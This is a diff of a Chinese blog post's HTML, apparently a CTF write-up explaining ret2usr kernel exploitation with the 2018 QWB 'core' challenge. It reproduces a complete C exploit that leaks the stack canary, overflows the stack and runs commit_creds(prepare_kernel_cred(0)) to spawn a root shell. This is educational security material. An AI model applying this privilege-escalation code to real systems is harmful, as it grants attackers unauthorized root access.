@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="ret2usr利用手法以及常见保护机制绕过浅析ret2usr在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。 这里仍以2018 强网杯 - core为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。 12345678910">
+        <meta name="description" content="ret2usr利用手法以及常见保护机制绕过浅析 ret2usr 在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。 这里仍以2018 强网杯 - core为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。 1234">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ret2usr利用手法以及常见保护机制绕过浅析">
 <meta property="og:url" content="https://collectcrop.github.io/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/index.html">
 <meta property="og:site_name" content="Collectcrop&#39;s Blog">
-<meta property="og:description" content="ret2usr利用手法以及常见保护机制绕过浅析ret2usr在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。 这里仍以2018 强网杯 - core为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。 12345678910">
+<meta property="og:description" content="ret2usr利用手法以及常见保护机制绕过浅析 ret2usr 在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。 这里仍以2018 强网杯 - core为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。 1234">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250228231014411.png">
 <meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117010705905.png">
@@ -131,7 +131,11 @@
     
     
     
-<meta name="generator" content="Hexo 7.3.0"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 
 
@@ -692,8 +696,12 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h2 id="ret2usr利用手法以及常见保护机制绕过浅析"><a href="#ret2usr利用手法以及常见保护机制绕过浅析" class="headerlink" title="ret2usr利用手法以及常见保护机制绕过浅析"></a>ret2usr利用手法以及常见保护机制绕过浅析</h2><h4 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h4><p>在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。</p>
-<p>这里仍以<strong>2018 强网杯 - core</strong>为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。</p>
+			<h2
+id="ret2usr利用手法以及常见保护机制绕过浅析">ret2usr利用手法以及常见保护机制绕过浅析</h2>
+<h4 id="ret2usr">ret2usr</h4>
+<p>在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。</p>
+<p>这里仍以<strong>2018 强网杯 -
+core</strong>为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># poweroff -d 120 -f &amp;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid /bin/cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># poweroff -d 0  -f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p>从init文件中我们可以看出<code>/proc/kallsyms</code>中存的符号信息被备份到了<code>/tmp/kallsyms</code>。这样一来<code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>使普通用户无法查看确切的内核符号加载地址的措施就形同虚设了。那么之后我们写exp时就能够直接打开<code>/tmp/kallsyms</code>文件进行读取操作。</p>
 <img  
@@ -729,28 +737,38 @@
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145051360.png"
                       class=""
                 >
-<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64 个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量 <code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code> 来 将canary 和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。 </p>
+<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64
+个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量
+<code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code>
+来 将canary
+和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145312844.png"
                       class=""
                 >
-<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。 </p>
+<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code>
+中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是
+<code>unsigned __int16</code>，但传递的长度是
+<code>signed __int64</code>，因此如果控制传入的长度为
+<code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145441269.png"
                       class=""
                 >
-<p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了 </p>
+<p><strong>core_write()</strong> 向全局变量 <code>name</code>
+上写，这样通过 <code>core_write()</code> 和
+<code>core_copy_func()</code> 就可以控制 ropchain 了</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145616435.png"
                       class=""
                 >
-<p>那我们可以首先靠读取<code>/tmp/kallsyms</code>来获取内核符号基址，然后可以直接劫持控制流到用户空间，用户空间则是提前布置调用内核函数的<code>commit_creds(prepare_kernel_cred(null))</code>，然后最后返回用户态执行system(“/bin/sh”)。</p>
+<p>那我们可以首先靠读取<code>/tmp/kallsyms</code>来获取内核符号基址，然后可以直接劫持控制流到用户空间，用户空间则是提前布置调用内核函数的<code>commit_creds(prepare_kernel_cred(null))</code>，然后最后返回用户态执行system("/bin/sh")。</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc ret2usr.c -static -masm=intel -g -o ret2usr</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getPrivilege</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <img  
                      lazyload
@@ -758,7 +776,7 @@
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301112049755.png"
                       class=""
                 >
-<p>这个exp是参照了ctfwiki上的exp，这时我有个疑问就是为什么即使可以直接执行用户空间的代码，最后还需要<code>swapgs; popfq; ret;</code>以及<code>iretq; ret</code>着陆用户态呢，如果直接返回到system(“/bin/sh”)又会发生什么呢？</p>
+<p>这个exp是参照了ctfwiki上的exp，这时我有个疑问就是为什么即使可以直接执行用户空间的代码，最后还需要<code>swapgs; popfq; ret;</code>以及<code>iretq; ret</code>着陆用户态呢，如果直接返回到system("/bin/sh")又会发生什么呢？</p>
 <p>这里我们把rop缩短至如下：</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br></pre></td></tr></table></figure></div>
 <img  
@@ -774,24 +792,34 @@
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301144122307.png"
                       class=""
                 >
-<p>如果<strong>控制了内核态的 RIP</strong>，并且直接让 <code>RIP</code> 指向 <code>system(&quot;/bin/sh&quot;)</code> 这样的 libc 函数，会发生以下情况：</p>
-<ol>
-<li><strong>system() 仍然在内核态运行</strong><ul>
